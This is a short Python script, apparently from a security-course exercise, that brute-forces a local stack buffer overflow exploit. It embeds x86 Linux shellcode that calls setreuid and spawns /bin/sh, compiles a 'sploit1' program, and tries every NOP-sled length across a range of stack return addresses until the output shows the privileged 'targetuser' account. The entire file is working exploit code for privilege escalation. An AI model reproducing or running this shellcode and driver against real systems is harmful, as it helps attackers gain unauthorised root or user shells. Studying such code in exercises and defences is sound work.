import subprocess
import struct

shellcode = (
    b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xa4\xb3\x1f\xb1\x1f\xb2\x1f"
    b"\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c"
    b"\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8"
    b"\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
)

MAX_NOP_LENGTH = 100
ebp_offset = 44
eip_offset = 48

def run_exploit(nop_length, eip_address):
    print(f"[*] Trying NOP length: {nop_length}, EIP address: {hex(eip_address)}")
    
    try:
        # Run the sploit program with the NOP sled length and EIP address as arguments
        p = subprocess.Popen(["./sploit1", str(nop_length), hex(eip_address)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = p.communicate()
        
        # Check if the exploit was successful
        if b"targetuser" in output:
            print(f"[+] Exploit succeeded with NOP length: {nop_length}, EIP address: {hex(eip_address)}")
            print(output.decode())
            return True
        
        # Print any error messages
        if error:
            print(f"[-] Error: {error.decode().strip()}")
        
    except Exception as e:
        print(f"[-] Exception occurred: {str(e)}")
    
    return False

def brute_force():
    # Test all combinations of NOP lengths and addresses
    for nop_length in range(1, MAX_NOP_LENGTH + 1):
        for addr in range(0xffff0000, 0xffffffff + 1):
            if run_exploit(nop_length, addr):
                return
    
    print("[-] Exploit failed. No suitable NOP length and address found.")

if __name__ == "__main__":
    print("[*] Starting brute-force analysis...")
    
    # Compile the sploit program
    print("[*] Compiling the sploit program...")
    subprocess.run(["gcc", "-o", "sploit1", "sploit1.c"])
    print("[+] Sploit program compiled.")
    
    brute_force()
    print("[*] Brute-force analysis completed.")